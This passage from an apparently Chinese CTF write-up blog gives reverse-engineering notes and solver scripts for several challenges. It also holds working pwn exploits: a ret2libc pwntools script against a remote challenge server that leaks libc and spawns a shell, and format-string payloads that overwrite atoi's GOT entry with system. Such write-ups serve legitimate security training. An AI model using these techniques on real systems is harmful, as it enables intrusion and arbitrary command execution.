class="string">&#x27;/home/kali/Music/libc32/libc-2.23.so&#x27;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25866</span>)</span><br><span class="line">payload =<span class="string">&#x27;\x00&#x27;</span>*<span class="number">7</span>+p16(<span class="number">0xE7</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">func_addr = <span class="number">0x80487d0</span></span><br><span class="line">write_addr = <span class="number">0x8048578</span></span><br><span class="line">pppr_addr = <span class="number">0x080488f9</span></span><br><span class="line">write_symbol = <span class="number">0x8049FEC</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xeb</span>+p32(write_addr)+p32(pppr_addr)+p32(<span class="number">1</span>)+p32(write_symbol)+p32(<span class="number">4</span>)+p32(func_addr)+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0xE7</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line">libc_base = write_addr-libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">sys_addr = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xeb</span>+p32(sys_addr)+p32(<span class="number">0</span>)+p32(binsh)</span><br><span class="line"></span><br><span class="line">info(<span class="string">&quot;sys_addr: 0x%08x,binsh: 0x%08x&quot;</span>,sys_addr,binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

## [rev][SCTF2019]Who is he

1. 找Assembly-CSharp.dll，反编译的答案，错的
2. 看wp，感觉很离谱
3. 使用CE搜索Emmm，找到两处字符串，查看此时的Memory View，分别转到两个字符串，发现两个base64串和两个4字节的字符串，分别尝试，第二个成功了= =
4. 需要学习C#加密相关操作，另外吐槽x64dbg的字符串搜索不怎么好用。。
5. 继续使用CE在内存中翻找，可以找到PE头，把dll dump下来，和结果内容基本一致
6. dnspy调试unity也需要学习

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES,AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line">s = bytes([<span class="number">0x78</span>,<span class="number">0x5A</span>,<span class="number">0x57</span>,<span class="number">0x44</span>,<span class="number">0x5A</span>,<span class="number">0x61</span>,<span class="number">0x4B</span>,<span class="number">0x45</span>,<span class="number">0x68</span>,<span class="number">0x57</span>,<span class="number">0x4E</span>,<span class="number">0x4D</span>,<span class="number">0x43</span>,<span class="number">0x62</span>,<span class="number">0x69</span>,<span class="number">0x47</span>,<span class="number">0x59</span>,<span class="number">0x50</span>,<span class="number">0x42</span>,<span class="number">0x49</span>,<span class="number">0x6C</span>,<span class="number">0x59</span>,<span class="number">0x33</span>,<span class="number">0x2B</span>,<span class="number">0x61</span>,<span class="number">0x72</span>,<span class="number">0x6F</span>,<span class="number">0x7A</span>,<span class="number">0x4F</span>,<span class="number">0x39</span>,<span class="number">0x7A</span>,<span class="number">0x6F</span>,<span class="number">0x6E</span>,<span class="number">0x77</span>,<span class="number">0x72</span>,<span class="number">0x59</span>,<span class="number">0x4C</span>,<span class="number">0x69</span>,<span class="number">0x56</span>,<span class="number">0x4C</span>,<span class="number">0x34</span>,<span class="number">0x6E</span>,<span class="number">0x6A</span>,<span class="number">0x53</span>,<span class="number">0x65</span>,<span class="number">0x7A</span>,<span class="number">0x32</span>,<span class="number">0x52</span>,<span class="number">0x59</span>,<span class="number">0x4D</span>,<span class="number">0x32</span>,<span class="number">0x57</span>,<span class="number">0x77</span>,<span class="number">0x73</span>,<span class="number">0x47</span>,<span class="number">0x6E</span>,<span class="number">0x73</span>,<span class="number">0x6E</span>,<span class="number">0x6A</span>,<span class="number">0x43</span>,<span class="number">0x44</span>,<span class="number">0x6E</span>,<span class="number">0x48</span>,<span class="number">0x73</span>,<span class="number">0x37</span>,<span class="number">0x4E</span>,<span class="number">0x34</span>,<span class="number">0x33</span>,<span class="number">0x61</span>,<span class="number">0x46</span>,<span class="number">0x76</span>,<span class="number">0x4E</span>,<span class="number">0x45</span>,<span class="number">0x35</span>,<span class="number">0x34</span>,<span class="number">0x6E</span>,<span class="number">0x6F</span>,<span class="number">0x53</span>,<span class="number">0x61</span>,<span class="number">0x64</span>,<span class="number">0x50</span>,<span class="number">0x39</span>,<span class="number">0x46</span>,<span class="number">0x38</span>,<span class="number">0x65</span>,<span class="number">0x45</span>,<span class="number">0x70</span>,<span class="number">0x76</span>,<span class="number">0x54</span>,<span class="number">0x73</span>,<span class="number">0x35</span>,<span class="number">0x51</span>,<span class="number">0x50</span>,<span class="number">0x47</span>,<span class="number">0x2B</span>,<span class="number">0x4B</span>,<span class="number">0x4C</span>,<span class="number">0x30</span>,<span class="number">0x54</span>,<span class="number">0x44</span>,<span class="number">0x45</span>,<span class="number">0x2F</span>,<span class="number">0x34</span>,<span class="number">0x30</span>,<span class="number">0x6E</span>,<span class="number">0x62</span>,<span class="number">0x55</span>,<span class="number">0x3D</span>])</span><br><span class="line">print(len(s))</span><br><span class="line"><span class="comment"># key = bytes(&#x27;1234&#x27;,encoding=&#x27;utf-8&#x27;)</span></span><br><span class="line">key = <span class="string">b&#x27;t\x00e\x00s\x00t\x00&#x27;</span></span><br><span class="line">s = base64.b64decode(s)</span><br><span class="line">print(s,len(s))</span><br><span class="line">print(key,len(key))</span><br><span class="line">des = DES.new(key=key,mode=DES.MODE_CBC,iv=key)</span><br><span class="line">res = des.decrypt(s)</span><br><span class="line">print(res)</span><br><span class="line">print(res.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

## 参考资料

[1] [2019SCTF -- ctfwp](https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2019SCTF)

## [rev][NPUCTF2020]Baby Obfuscation

1. F0X1

   辗转相除法求a,b最大公约数

2. F0X4

   ~(~a + b)=~(-a+b-1)=-(b-a-1)-1=a-b

3. F0X5

   快速幂

4. F0X3

    a&amp;&amp;b

5. F0X2

    !a&amp;&amp;!b

6. for循环

   1. 第一个if

      v33[j]=~(~str[j-1]+v35[(j-1)%4+4])=str[j-1]-v35[(j-1)%4+4]

   2. 第二个if不可能执行

   3. 第三个if

      v33[j]^=v35[(j-1)%4+4]

   4. 第四个if必不执行

   5. v33[j]*=10

7. 字符串长度为15

8. 比对

   (A0X6[k+1]-1)/10==v33[k]

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* name, <span class="keyword">uint8_t</span>* data, <span class="keyword">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;==============%s========&quot;</span>, name);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(i % <span class="number">16</span>))<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02x,&quot;</span>, data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n================================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> a[] = &#123;<span class="number">0x1e79</span>, <span class="number">0x1e79</span>, <span class="number">0x2135</span>, <span class="number">0x170d</span>, <span class="number">0x1f41</span>, <span class="number">0x1901</span>, <span class="number">0x2ced</span>, <span class="number">0x11f9</span>, <span class="number">0x2649</span>, <span class="number">0x2581</span>, <span class="number">0x2db5</span>, <span class="number">0x14b5</span>, <span class="number">0x25e5</span>, <span class="number">0x2a31</span>, <span class="number">0x30d5</span>&#125;;</span><br><span class="line">    <span class="keyword">uint8_t</span> flag[<span class="number">16</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> xorD[] = &#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">15</span>;i++)&#123;</span><br><span class="line">        a[i]-=<span class="number">1</span>;</span><br><span class="line">        a[i]/=<span class="number">100</span>;</span><br><span class="line">        a[i]^=xorD[i%<span class="number">4</span>];</span><br><span class="line">        flag[i]=a[i]+xorD[i%<span class="number">4</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

## [rev][De1CTF2019]Re_Sign

1. UPX加壳了，可是upx官方版说没加壳，使用upx官方版加壳又说加壳了= =，只好手动脱壳。具体操作为pushad之后栈上下硬件断点，F9到popad之后有个long jmp，jmp之后再单步调试法找到OEP在0x401000。之后使用Scylla插件dump内存为可执行文件，并且dump之后fix_dump
2. 程序使用了什么库(搜不到)，只能一步一步尝试
3. 关键函数
   - 401233使用了换表base64编码，调试发现的，具体生成表操作在401615到4016F0之间
   - 402160再找到字母在标准b64表中的位置

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES,AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm+/=&#x27;</span></span><br><span class="line"></span><br><span class="line">print(len(s))</span><br><span class="line">b64tab = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line">dicn = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65</span>):</span><br><span class="line">    dic[s[i]]=b64tab[i]</span><br><span class="line">    dicn[b64tab[i]]=i</span><br><span class="line"></span><br><span class="line">fa = [<span class="number">0x08</span>,<span class="number">0x3B</span>,<span class="number">0x01</span>,<span class="number">0x20</span>,<span class="number">0x07</span>,<span class="number">0x34</span>,<span class="number">0x09</span>,<span class="number">0x1F</span>,<span class="number">0x18</span>,<span class="number">0x24</span>,<span class="number">0x13</span>,<span class="number">0x03</span>,<span class="number">0x10</span>,<span class="number">0x38</span>,<span class="number">0x09</span>,<span class="number">0x1B</span>,<span class="number">0x08</span>,<span class="number">0x34</span>,<span class="number">0x13</span>,<span class="number">0x02</span>,<span class="number">0x08</span>,<span class="number">0x22</span>,<span class="number">0x12</span>,<span class="number">0x03</span>,<span class="number">0x05</span>,<span class="number">0x06</span>,<span class="number">0x12</span>,<span class="number">0x03</span>,<span class="number">0x0F</span>,<span class="number">0x22</span>,<span class="number">0x12</span>,<span class="number">0x17</span>,<span class="number">0x08</span>,<span class="number">0x01</span>,<span class="number">0x29</span>,<span class="number">0x22</span>,<span class="number">0x06</span>,<span class="number">0x24</span>,<span class="number">0x32</span>,<span class="number">0x24</span>,<span class="number">0x0F</span>,<span class="number">0x1F</span>,<span class="number">0x2B</span>,<span class="number">0x24</span>,<span class="number">0x03</span>,<span class="number">0x15</span>,<span class="number">0x41</span>,<span class="number">0x41</span>]</span><br><span class="line">fs = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> fa:</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    fs+=b64tab[i<span class="number">-1</span>]</span><br><span class="line">print(fs)</span><br><span class="line">sfs = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> fs:</span><br><span class="line">    sfs+=dic[i]</span><br><span class="line">print(sfs)</span><br><span class="line">print(base64.b64decode(bytes(sfs,encoding=<span class="string">&#x27;utf-8&#x27;</span>)))</span><br></pre></td></tr></table></figure>

## [rev]HellScream

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BigInteger</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">int</span> data[MAX_LEN];</span><br><span class="line">&#125; BigInteger;</span><br></pre></td></tr></table></figure>

1. 4019F0 a1的元素左移4位copy到a2上

2. 401940 a2的元素加到a1第一个dword上，溢出则溢出部分加到第二个数上面，以此类推

   从这里看出实现了一个大整数运算库

3. 406330 把int值转化成对应的base16串，小端字节序

4. 405310 把BigInteger放入数组

5. 406230 直接把字符串放入username对应的结构体data字段

6. 4020E0 根据406330得出大概是mod()，并且有三个参数，分别是被除数(也是余数的存放位置),商存放位置，除数

7. 403E30 猜测是mod n

8. 4018E0 复制String

9. 401910 将a1初始化为String且初始值为a2

10. 401510 check函数

    - 最终input=Happy Birthday Buddy
    - 核心逻辑似乎在401000
    - 4062A0 把结构体中的数据提取到input
    - 4064D0 pow mod n

看题解了，RSA算法

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES,AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">0xA324F100182D501F6F6F78F397A3AA59641023D6A3DED8A4BF344F1E0FC71C188F4D</span></span><br><span class="line">p = <span class="number">62822928286347608648869628628072621308819</span></span><br><span class="line">q = <span class="number">76979057716441943100156208562083628995999</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">e = powmod(<span class="number">0x6D6F632E6D736131352E777777</span>,<span class="number">17</span>,n)</span><br><span class="line"><span class="comment"># m = 0x6B6F007964647542207961646874726942207970706148 # Happy Birthday Buddy\x00ok</span></span><br><span class="line">m = <span class="number">0x7964647542207961646874726942207970706148</span></span><br><span class="line"><span class="comment"># E &lt;= e+99</span></span><br><span class="line">d = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    E = e+i</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d=invert(E,phi)</span><br><span class="line">        print(i)</span><br><span class="line">        print(hex(powmod(m,d,n)).upper())</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">r = <span class="number">0x1234567890</span></span><br><span class="line">print(hex(e))</span><br></pre></td></tr></table></figure>

## [rev]Snake

总是纠结于Assembly-CSharp.dll，实际上flag不在里面啊555

1. 查看各个类，发现有个Interface类是C代码写的，所以应该找到这个Interface，使用IDA打开
2. 然后查看各个方法的参考，其中GameObject在Move中被调用，传入的参数为x，y坐标，所以不会很大，观察常量为199
3. 直接加载dll爆破flag即可
4. 查看dll，利用了大整数库，应该是公钥加密之类的

<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    HMODULE hMod = LoadLibraryA(<span class="string">&quot;C:\\Users\\Tom\\Downloads\\Snake\\Snake_Data\\Plugins\\Interface.dll&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">int64_t</span> <span class="params">(*FuncPtr)</span><span class="params">(<span class="keyword">int</span> i)</span></span>;</span><br><span class="line">    FuncPtr func = (FuncPtr) GetProcAddress(hMod,<span class="string">&quot;GameObject&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(hMod==<span class="literal">NULL</span>||func==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Load Failed&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">200</span>;i++)&#123;</span><br><span class="line">        func(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

flag&#123;Ch4rp_W1th_R$@&#125;

## [rev][HDCTF2019]MFC

MFC程序逆向

1. 程序加了VMP，一时半会儿弄不出来
2. 使用xspy得到一个奇怪的消息码：0x464
3. 使用对应的消息码给程序发消息，得到一个des key
4. 使用CE搜索Flag，发现上方不远处有一串字符串，就是加密过的文本

<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    HWND h = FindWindowW(<span class="literal">NULL</span>,<span class="string">L&quot;Flag就在控件里&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(h==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        SendMessage(h,<span class="number">0x464</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

http://tool.chacuo.net/cryptdes

## [pwn][第五空间2019 决赛]PWN5

printf可以实现任意地址读写

任意地址写的payload可以使用fmtstr_payload方法生成

### 1

在随机数出写入自定义的值

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn-1&#x27;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x804c044</span></span><br><span class="line">payload = p32(addr)+p32(addr+<span class="number">1</span>)+p32(addr+<span class="number">2</span>)+p32(addr+<span class="number">3</span>)</span><br><span class="line">payload +=<span class="string">r&#x27;%10$hhn&#x27;</span>+<span class="string">r&#x27;%11$hhn&#x27;</span>+<span class="string">r&#x27;%12$hhn&#x27;</span>+<span class="string">r&#x27;%13$hhn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x10101010</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

### 2

修改atoi函数的got表指向system，然后传/bin/sh

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn-1&#x27;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;./pwn-1&#x27;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x804c044</span></span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">atoi_addr = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>,&#123;atoi_addr:sys_addr&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

### 3

读取随机数的值，然后填那个值，需要注意符号。很不稳定，容易出现溢出，比如说正负数问题，只有在随机数为正时可以pwn

